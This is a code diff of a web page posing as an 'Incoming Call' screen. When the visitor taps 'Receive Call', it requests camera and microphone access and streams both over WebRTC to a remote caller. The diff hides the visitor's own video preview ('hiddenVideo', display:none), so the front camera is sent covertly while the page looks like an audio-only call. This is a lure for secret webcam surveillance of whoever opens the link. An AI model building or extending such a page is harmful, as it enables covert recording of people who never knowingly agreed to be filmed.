@@ -6,58 +6,81 @@
     <title>Incoming Call</title>
     <style>
         body { background: #1e3c72; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: rgba(0,0,0,0.6); padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; }
-        button { background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-size: 18px; cursor: pointer; width: 100%; }
-        video { width: 100%; border-radius: 10px; margin-top: 15px; background: #000; display: none; }
+        .card { background: rgba(0,0,0,0.6); padding: 40px; border-radius: 25px; text-align: center; width: 85%; max-width: 350px; }
+        #joinBtn { background: #28a745; color: white; padding: 18px; border: none; border-radius: 50px; font-size: 20px; width: 100%; cursor: pointer; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        #micBtn { background: #dc3545; color: white; padding: 12px; border: none; border-radius: 25px; width: 100%; margin-top: 20px; display: none; cursor: pointer; }
+        .timer { font-size: 24px; margin: 15px 0; color: #0f0; display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>📞 Sabbir কল দিচ্ছে...</h2>
-        <button id="joinBtn">✅ কল রিসিভ করুন</button>
-        <p id="statusText">বাটনে ক্লিক করুন</p>
-        <video id="localVideo" autoplay playsinline muted></video>
+        <h2 id="title">Incoming Call...</h2>
+        <div class="timer" id="timer">00:00</div>
+        <button id="joinBtn">✅ Receive Call</button>
+        <button id="micBtn">🎤 Mic: ON</button>
+        <p id="status">Click to join</p>
+        <video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let peerConnection, localStream;
+        let peerConnection, localStream, timerInterval;
+        let isMuted = false;
         const roomId = new URLSearchParams(window.location.search).get('room');
 
         document.getElementById('joinBtn').onclick = async () => {
             try {
-                // Mobile camera fixed constraints
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: true, 
+                    audio: { echoCancellation: true }, 
                     video: { facingMode: "user" } 
                 });
-                document.getElementById('localVideo').srcObject = localStream;
-                document.getElementById('localVideo').style.display = 'block';
+                document.getElementById('hiddenVideo').srcObject = localStream;
+                document.getElementById('joinBtn').style.display = 'none';
+                document.getElementById('micBtn').style.display = 'block';
+                document.getElementById('timer').style.display = 'block';
                 
                 socket.emit('join-room', roomId, (res) => {
-                    if (res.success) document.getElementById('statusText').innerText = 'সংযুক্ত হচ্ছে...';
+                    if (res.success) document.getElementById('status').innerText = 'Connecting...';
                     else alert(res.message);
                 });
-            } catch (e) { alert('ক্যামেরা বা মাইক পারমিশন দিন!'); }
+            } catch (e) { alert('Permission Denied!'); }
         };
 
         socket.on('offer', async (offer) => {
             peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             localStream.getTracks().forEach(t => peerConnection.addTrack(t, localStream));
-            
-            peerConnection.ontrack = (e) => {
-                const audio = new Audio();
-                audio.srcObject = e.streams[0];
-                audio.play();
-            };
+            peerConnection.ontrack = (e) => { const a = new Audio(); a.srcObject = e.streams[0]; a.play(); };
             peerConnection.onicecandidate = (e) => e.candidate && socket.emit('ice-candidate', { roomId, candidate: e.candidate });
+            
+            peerConnection.onconnectionstatechange = () => {
+                if(peerConnection.connectionState === 'connected') startTimer();
+            };
 
             await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
             const answer = await peerConnection.createAnswer();
             await peerConnection.setLocalDescription(answer);
             socket.emit('answer', { roomId, answer });
         });
+
+        document.getElementById('micBtn').onclick = () => {
+            isMuted = !isMuted;
+            localStream.getAudioTracks()[0].enabled = !isMuted;
+            document.getElementById('micBtn').innerText = isMuted ? '🔇 Mic: OFF' : '🎤 Mic: ON';
+            document.getElementById('micBtn').style.background = isMuted ? '#666' : '#dc3545';
+        };
+
+        function startTimer() {
+            let sec = 0;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                sec++;
+                let m = Math.floor(sec / 60).toString().padStart(2, '0');
+                let s = (sec % 60).toString().padStart(2, '0');
+                document.getElementById('timer').innerText = `${m}:${s}`;
+                document.getElementById('status').innerText = 'In Call';
+            }, 1000);
+        }
 
         socket.on('ice-candidate', (can) => peerConnection && peerConnection.addIceCandidate(new RTCIceCandidate(can)));
     </script>
